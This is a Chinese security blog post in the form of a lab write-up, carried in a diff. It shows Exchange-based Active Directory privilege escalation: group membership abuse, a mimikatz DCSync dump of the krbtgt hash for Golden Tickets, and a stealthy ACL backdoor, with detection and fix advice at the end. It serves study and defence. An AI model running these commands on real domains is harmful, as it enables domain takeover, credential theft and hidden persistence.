@@ -1,0 +1,321 @@
+I"�B<h2 id="0x00">0x00</h2>
+<hr />
+
+<p>最近学到的一个域环境下的提权技巧，在域环境中，安装Exchange后会添加一个名为<code class="language-plaintext highlighter-rouge">Microsoft Exchange Security Groups</code>的OU，其中包括两个特殊的组：<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>和<code class="language-plaintext highlighter-rouge">Exchange Windows Permission</code>，如果获得了这两个组内任意用户的控制权限，就能够继承该组的WriteDACL权限，进而修改域对象的ACL，最终实现利用DCSync导出域内所有用户hash。接下来可以使用域用户krbtgt的hash制作Golden Ticket，登录域控制器，获得对整个域的控制权限。</p>
+
+<p>学习资料：</p>
+
+<p>https://github.com/gdedrouas/Exchange-AD-Privesc</p>
+
+<p>本文将会记录复现过程，介绍利用这个机制建立提权后门的方法，详细介绍使用PowerView对域对象ACL的操作方法，最后给出检测和防御建议。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>提权方法复现</li>
+  <li>建立提权后门的方法</li>
+  <li>检测和防御建议</li>
+</ul>
+
+<h2 id="0x02-提权方法复现">0x02 提权方法复现</h2>
+<hr />
+
+<p>测试环境：</p>
+
+<ul>
+  <li>Server2012R2 x64</li>
+  <li>Exchange 2013</li>
+</ul>
+
+<h3 id="前置知识">前置知识</h3>
+
+<h4 id="1常用缩写词">1.常用缩写词</h4>
+
+<ul>
+  <li>DN:Distinguished Name</li>
+  <li>CN:Common Name</li>
+  <li>OU:Organizational Unit</li>
+  <li>DC:Domain Component</li>
+  <li>ACE:Access Control Entries</li>
+  <li>ACL:Access Control List</li>
+</ul>
+
+<p>LDAP连接服务器的连接字串格式为：ldap://servername/DN</p>
+
+<p>其中DN有三个属性，分别是CN、OU和DC</p>
+
+<h4 id="2安装exchange后默认会自动添加一个名为microsoft-exchange-security-groups的ou">2.安装Exchange后默认会自动添加一个名为Microsoft Exchange Security Groups的OU</h4>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/2-1.png" alt="Alt text" /></p>
+
+<p>其中包括两个特殊的组：<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>和<code class="language-plaintext highlighter-rouge">Exchange Windows Permission</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>是<code class="language-plaintext highlighter-rouge">Exchange Windows Permission</code>的成员</p>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/2-2.png" alt="Alt text" /></p>
+
+<p>默认情况下，<code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code>对安装Exchange的域对象具有WriteDACL权限，那么<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>也会继承这个权限</p>
+
+<h4 id="3如果对域对象具有writedacl权限就能够为指定域用户添加ace使其获得利用dcsync导出域内所有用户hash的权限接下来可以使用域用户krbtgt的hash制作golden-ticket登录域控制器获得对整个域的控制权限">3.如果对域对象具有WriteDACL权限，就能够为指定域用户添加ACE，使其获得利用DCSync导出域内所有用户hash的权限，接下来可以使用域用户krbtgt的hash制作Golden Ticket，登录域控制器，获得对整个域的控制权限</h4>
+
+<p>详细利用方法可参考之前的文章：<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync">《域渗透——DCSync》</a></p>
+
+<h4 id="4使用powerview能够对域对象的acl进行操作">4.使用PowerView能够对域对象的ACL进行操作</h4>
+
+<p>值得注意的是PowerView存在两个版本，有些功能只在dev版本中支持，两个版本的地址分别为：</p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1</p>
+
+<p>这个细节在之前的文章<a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-AdminSDHolder">《域渗透——AdminSDHolder》</a>有过介绍</p>
+
+<h3 id="实际测试">实际测试</h3>
+
+<p>这里以<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>作为测试对象，测试用户testa的口令已经获得，先将测试用户testa添加到<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>中</p>
+
+<p>Powershell命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ActiveDirectory
+Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testa
+</code></pre></div></div>
+
+<p>对于未安装Active Directory模块的Windows系统，可以通过如下命令导入Active Directory模块：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
+Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testa
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Microsoft.ActiveDirectory.Management.dll</code>在安装powershell模块Active Directory后生成，我已经提取出来并上传至github：</p>
+
+<p>https://github.com/3gstudent/test/blob/master/Microsoft.ActiveDirectory.Management.dll</p>
+
+<p>添加成功后如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/3-1.png" alt="Alt text" /></p>
+
+<p>接下来，在另一台域内主机上完成所有提权的操作</p>
+
+<h4 id="1登录用户testa">1.登录用户testa</h4>
+
+<p>cmd：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 123456789 | runas /user:test\testa cmd
+</code></pre></div></div>
+
+<p>如果在测试过程中，第一次将测试用户testa添加到<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>中，那么用户testa需要重新登录才能继承WriteDACL权限</p>
+
+<p>查看用户testa所在的组：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whoami /groups
+</code></pre></div></div>
+
+<p>发现用户testa成功加入<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>组，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/3-2.png" alt="Alt text" /></p>
+
+<h4 id="2使用mimikatz的dcsync功能导出用户krbtgt的hash">2.使用mimikatz的DCSync功能导出用户krbtgt的hash</h4>
+
+<p>cmd：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:krbtgt /csv" exit
+</code></pre></div></div>
+
+<p>成功导出用户krbtgt的hash，如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/3-3.png" alt="Alt text" /></p>
+
+<p>接下来可以使用域用户krbtgt的hash制作Golden Ticket，登录域控制器，获得对整个域的控制权限</p>
+
+<p>提权成功</p>
+
+<p>经过多次测试，得出以下结论：</p>
+
+<p>如果获得了以下三个组内任意用户的权限，都能够利用DCSync导出域内所有用户hash</p>
+
+<p>组名如下：</p>
+
+<ul>
+  <li>Exchange Trusted Subsystem</li>
+  <li>Exchange Windows Permission</li>
+  <li>Organization Management</li>
+</ul>
+
+<h2 id="0x03-建立提权后门的方法">0x03 建立提权后门的方法</h2>
+<hr />
+
+<p>如果获得了整个域的控制权限，可以利用Exchange中的ACL作为域提权的后门</p>
+
+<h3 id="方法1直接在exchange的三个组内添加后门用户">方法1：直接在Exchange的三个组内添加后门用户</h3>
+
+<p>这里以<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>为例</p>
+
+<p>Powershell命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module ActiveDirectory
+Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testa
+</code></pre></div></div>
+
+<p>但是不够隐蔽，很容易被发现添加的用户</p>
+
+<p>查看的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group "Exchange Trusted Subsystem" /domain
+</code></pre></div></div>
+
+<h3 id="方法2只添加特定用户对exchange中三个组acl的控制权限">方法2：只添加特定用户对Exchange中三个组ACL的控制权限</h3>
+
+<p>这里以<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>为例</p>
+
+<h4 id="1首先需要找到exchange-trusted-subsystem的dndistinguished-name">1.首先需要找到Exchange Trusted Subsystem的DN(Distinguished Name)</h4>
+
+<p>需要使用Powerview的dev版本，地址如下：</p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</p>
+
+<p>查看所有DN的Powershell命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-Module .\PowerView.ps1
+Get-DomainObject -Properties distinguishedname |fl
+</code></pre></div></div>
+
+<p>找到<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>的DN为：<code class="language-plaintext highlighter-rouge">CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com</code></p>
+
+<h4 id="2查看exchange-trusted-subsystem的acl">2.查看Exchange Trusted Subsystem的ACL</h4>
+
+<p>Powershell命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObjectAcl -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com"
+</code></pre></div></div>
+
+<h4 id="3获得exchange-trusted-subsystem的原始数据">3.获得Exchange Trusted Subsystem的原始数据</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" -Raw
+</code></pre></div></div>
+
+<h4 id="4添加后门用户testb对exchange-trusted-subsystem的完全访问权限">4.添加后门用户testb对Exchange Trusted Subsystem的完全访问权限</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" -Raw
+$TargetObject = $RawObject.GetDirectoryEntry()
+$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity testb -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
+$TargetObject.PsBase.ObjectSecurity.AddAccessRule($ACE)
+$TargetObject.PsBase.CommitChanges()
+</code></pre></div></div>
+
+<p><strong>补充：</strong></p>
+
+<p>移除后门用户testb对<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>的完全访问权限：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$RawObject = Get-DomainObject -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" -Raw
+$TargetObject = $RawObject.GetDirectoryEntry()
+$ACE = New-ADObjectAccessControlEntry -InheritanceType All -AccessControlType Allow -PrincipalIdentity testb -Right AccessSystemSecurity,CreateChild,Delete,DeleteChild,DeleteTree,ExtendedRight,GenericAll,GenericExecute,GenericRead,GenericWrite,ListChildren,ListObject,ReadControl,ReadProperty,Self,Synchronize,WriteDacl,WriteOwner,WriteProperty
+$TargetObject.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
+$TargetObject.PsBase.CommitChanges()
+</code></pre></div></div>
+
+<h4 id="5查看用户testb的sid">5.查看用户testb的sid</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser testb
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/4-1.png" alt="Alt text" /></p>
+
+<p>用户testb的objectsid为<code class="language-plaintext highlighter-rouge">S-1-5-21-1672228480-1396590849-334771951-2105</code></p>
+
+<h4 id="6查看属于新添加用户testb的ace">6.查看属于新添加用户testb的ACE</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainObjectAcl -SearchBase "LDAP://CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=test,DC=com" | Where-Object {$_.SecurityIdentifier -eq "S-1-5-21-1672228480-1396590849-334771951-2105"}
+</code></pre></div></div>
+
+<p>如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-9-22/4-2.png" alt="Alt text" /></p>
+
+<p>至此，后门安装成功</p>
+
+<p>此时查看<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>组的用户：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net group "Exchange Trusted Subsystem" /domain
+</code></pre></div></div>
+
+<p>无法发现后门用户testb</p>
+
+<h3 id="后门启动方法">后门启动方法</h3>
+
+<h4 id="1在另一台域内主机上登录用户testb">1.在另一台域内主机上登录用户testb</h4>
+
+<p>cmd：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 123456789 | runas /user:test\testb cmd
+</code></pre></div></div>
+
+<h4 id="2将用户testb添加到exchange-trusted-subsystem">2.将用户testb添加到Exchange Trusted Subsystem</h4>
+
+<p>由于用户testb有对<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>的完全访问权限，所以能够将自己添加到<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>组中</p>
+
+<p>Powershell命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
+Add-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testb
+</code></pre></div></div>
+
+<h4 id="3重新登录用户testb">3.重新登录用户testb</h4>
+
+<p>cmd：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 123456789 | runas /user:test\testb cmd
+</code></pre></div></div>
+
+<h4 id="4使用mimikatz的dcsync功能导出用户krbtgt的hash">4.使用mimikatz的DCSync功能导出用户krbtgt的hash</h4>
+
+<p>cmd：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:krbtgt /csv" exit
+</code></pre></div></div>
+
+<h4 id="5将用户testb从exchange-trusted-subsystem组中移除">5.将用户testb从Exchange Trusted Subsystem组中移除</h4>
+
+<p>Powershell命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import-module .\Microsoft.ActiveDirectory.Management.dll
+Remove-ADGroupMember -Identity "Exchange Trusted Subsystem" -Members testb -confirm:$false
+</code></pre></div></div>
+
+<p>由于用户testb具有对<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code>的完全访问权限，所以能够反复将自己添加或是移除<code class="language-plaintext highlighter-rouge">Exchange Trusted Subsystem</code></p>
+
+<h2 id="0x04-检测和防御建议">0x04 检测和防御建议</h2>
+<hr />
+
+<p>从根源上修复：去除<code class="language-plaintext highlighter-rouge">Exchange Windows Permissions</code>的WriteDACL权限</p>
+
+<p>可供参考的脚本：</p>
+
+<p>https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/Fix-DomainObjectDACL.ps1</p>
+
+<p>日志检测：</p>
+
+<p>需要开启Active Directory的高级安全审核策略，当域对象的ACL被修改后，将产生ID为5136的日志</p>
+
+<p>参考资料：</p>
+
+<p>https://blogs.technet.microsoft.com/canitpro/2017/03/29/step-by-step-enabling-advanced-security-audit-policy-via-ds-access/</p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr />
+
+<p>本文记录了使用Exchange中特定ACL进行提权的过程，分析了利用条件，结合这个机制介绍了一个提权后门的利用方法，最后给出检测和防御建议。</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
